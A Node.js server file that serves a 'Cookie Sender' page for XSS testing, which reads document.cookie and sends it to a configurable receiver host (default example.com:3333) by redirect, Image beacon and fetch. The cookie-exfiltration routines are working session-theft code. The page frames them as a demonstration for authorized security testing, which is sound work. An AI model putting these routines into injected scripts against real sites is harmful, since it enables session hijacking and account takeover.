const http = require('http');

const server = http.createServer((req, res) => {
  const html = `
<!DOCTYPE html>
<html>
<head>
  <title>Cookie Sender - XSS Testing</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }
    .container {
      background: white;
      padding: 40px;
      border-radius: 12px;
      box-shadow: 0 20px 60px rgba(0,0,0,0.3);
      max-width: 600px;
      width: 100%;
    }
    h1 {
      color: #333;
      margin-bottom: 10px;
      font-size: 28px;
    }
    .subtitle {
      color: #666;
      margin-bottom: 30px;
      font-size: 14px;
    }
    .section {
      margin-bottom: 25px;
    }
    .section h2 {
      color: #667eea;
      font-size: 18px;
      margin-bottom: 15px;
    }
    input, textarea {
      width: 100%;
      padding: 12px;
      border: 2px solid #e0e0e0;
      border-radius: 6px;
      font-family: inherit;
      font-size: 14px;
      transition: border-color 0.3s;
    }
    input:focus, textarea:focus {
      outline: none;
      border-color: #667eea;
    }
    textarea {
      min-height: 100px;
      resize: vertical;
    }
    button {
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      color: white;
      border: none;
      padding: 14px 30px;
      border-radius: 6px;
      cursor: pointer;
      font-family: inherit;
      font-size: 16px;
      font-weight: 600;
      width: 100%;
      transition: transform 0.2s, box-shadow 0.2s;
    }
    button:hover {
      transform: translateY(-2px);
      box-shadow: 0 10px 20px rgba(102, 126, 234, 0.4);
    }
    button:active {
      transform: translateY(0);
    }
    .info {
      background: #f0f4ff;
      padding: 15px;
      border-radius: 6px;
      border-left: 4px solid #667eea;
      margin-bottom: 25px;
      font-size: 13px;
      color: #555;
    }
    .result {
      margin-top: 20px;
      padding: 15px;
      border-radius: 6px;
      font-size: 14px;
      display: none;
    }
    .result.success {
      background: #d4edda;
      color: #155724;
      border: 1px solid #c3e6cb;
    }
    .result.error {
      background: #f8d7da;
      color: #721c24;
      border: 1px solid #f5c6cb;
    }
    .cookie-display {
      background: #f9f9f9;
      padding: 12px;
      border-radius: 6px;
      border: 1px solid #e0e0e0;
      font-family: 'Courier New', monospace;
      font-size: 12px;
      word-break: break-all;
      margin-top: 10px;
      color: #333;
    }
    .btn-group {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 10px;
      margin-top: 10px;
    }
    .btn-secondary {
      background: #6c757d;
    }
    .btn-secondary:hover {
      box-shadow: 0 10px 20px rgba(108, 117, 125, 0.4);
    }
    label {
      display: block;
      margin-bottom: 8px;
      color: #555;
      font-weight: 500;
      font-size: 14px;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Cookie Sender</h1>
    <div class="subtitle">XSS Security Testing Tool</div>

    <div class="info">
      This page demonstrates cookie exfiltration for authorized security testing.
      Set cookies, then send them to your receiver server.
    </div>

    <div class="section">
      <h2>Current Cookies</h2>
      <div class="cookie-display" id="currentCookies">No cookies set</div>
    </div>

    <div class="section">
      <h2>Set Test Cookies</h2>
      <label>Cookie Name:</label>
      <input type="text" id="cookieName" placeholder="sessionId" value="sessionId">
      <br><br>
      <label>Cookie Value:</label>
      <input type="text" id="cookieValue" placeholder="abc123xyz456" value="secret_token_12345">
      <br><br>
      <div class="btn-group">
        <button onclick="setCookie()">Set Cookie</button>
        <button class="btn-secondary" onclick="clearCookies()">Clear All Cookies</button>
      </div>
    </div>

    <div class="section">
      <h2>Send Data to Receiver</h2>
      <label>Receiver URL:</label>
      <input type="text" id="receiverUrl" value="http://example.com:3333">
      <br><br>
      <label>Custom Data (optional):</label>
      <textarea id="customData" placeholder="Additional data to send..."></textarea>
      <br><br>
      <button onclick="sendCookies()">Send Cookies to Receiver</button>
      <div class="btn-group">
        <button class="btn-secondary" onclick="sendViaImage()">Send via Image</button>
        <button class="btn-secondary" onclick="sendViaFetch()">Send via Fetch</button>
      </div>
    </div>

    <div class="result" id="result"></div>
  </div>

  <script>
    function updateCookieDisplay() {
      const cookies = document.cookie || 'No cookies set';
      document.getElementById('currentCookies').textContent = cookies;
    }

    function setCookie() {
      const name = document.getElementById('cookieName').value;
      const value = document.getElementById('cookieValue').value;

      if (!name || !value) {
        showResult('Please enter both cookie name and value', 'error');
        return;
      }

      document.cookie = name + '=' + value + '; path=/';
      updateCookieDisplay();
      showResult('Cookie set successfully!', 'success');
    }

    function clearCookies() {
      const cookies = document.cookie.split(';');

      for (let i = 0; i < cookies.length; i++) {
        const cookie = cookies[i];
        const eqPos = cookie.indexOf('=');
        const name = eqPos > -1 ? cookie.substr(0, eqPos).trim() : cookie.trim();
        document.cookie = name + '=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/';
      }

      updateCookieDisplay();
      showResult('All cookies cleared!', 'success');
    }

    function sendCookies() {
      const url = document.getElementById('receiverUrl').value;
      const customData = document.getElementById('customData').value;
      const cookies = document.cookie;

      if (!cookies) {
        showResult('No cookies to send. Set some cookies first!', 'error');
        return;
      }

      const params = new URLSearchParams({
        cookies: cookies,
        data: customData || 'Sent from Cookie Sender',
        timestamp: new Date().toISOString()
      });

      window.location.href = url + '/?' + params.toString();
    }

    function sendViaImage() {
      const url = document.getElementById('receiverUrl').value;
      const customData = document.getElementById('customData').value;
      const cookies = document.cookie;

      if (!cookies) {
        showResult('No cookies to send. Set some cookies first!', 'error');
        return;
      }

      const params = new URLSearchParams({
        c: cookies,
        data: customData || 'Sent via Image tag',
        method: 'image'
      });

      const img = new Image();
      img.src = url + '/?' + params.toString();

      img.onload = () => showResult('Cookies sent successfully via Image tag!', 'success');
      img.onerror = () => showResult('Cookies sent (receiver may not return valid image)', 'success');
    }

    function sendViaFetch() {
      const url = document.getElementById('receiverUrl').value;
      const customData = document.getElementById('customData').value;
      const cookies = document.cookie;

      if (!cookies) {
        showResult('No cookies to send. Set some cookies first!', 'error');
        return;
      }

      const params = new URLSearchParams({
        c: cookies,
        data: customData || 'Sent via Fetch API',
        method: 'fetch'
      });

      fetch(url + '/?' + params.toString())
        .then(() => showResult('Cookies sent successfully via Fetch API!', 'success'))
        .catch(() => showResult('Request sent (CORS may block response, but data was sent)', 'success'));
    }

    function showResult(message, type) {
      const resultDiv = document.getElementById('result');
      resultDiv.textContent = message;
      resultDiv.className = 'result ' + type;
      resultDiv.style.display = 'block';

      setTimeout(() => {
        resultDiv.style.display = 'none';
      }, 5000);
    }

    // Update cookie display on load
    updateCookieDisplay();

    // Update cookie display every second
    setInterval(updateCookieDisplay, 1000);
  </script>
</body>
</html>
  `;

  res.writeHead(200, {
    'Content-Type': 'text/html',
  });
  res.end(html);
});

server.listen(3334, '0.0.0.0', () => {
  console.log('Cookie Sender running on http://0.0.0.0:3334');
});
